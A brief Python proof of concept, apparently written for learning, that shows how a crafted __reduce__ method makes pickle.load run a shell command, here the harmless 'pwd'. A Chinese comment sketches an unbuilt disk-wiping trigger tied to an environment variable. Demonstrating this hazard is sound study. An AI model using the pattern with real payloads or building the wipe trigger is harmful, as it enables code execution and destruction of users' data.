# -*- coding: utf-8  -*-
# -*- author: jokker -*-


import pickle
import os

# fixme 确实相当危险，只需要修改 __reduce__ 方法，就能执行恶意代码

# fixme 可以设置为，运行的时候要是环境变量中没有 某一个变量，或者某一个变量的值不等于某一个设定值，那么就清空磁盘中的多有内容


class Poc:
	def __reduce__(self):
		cmd = "pwd"
		return os.system, (cmd,)



poc = Poc()
pickle.dump(poc, open('poc.txt', 'wb'))

pickle.load(open('poc.txt', 'br'))

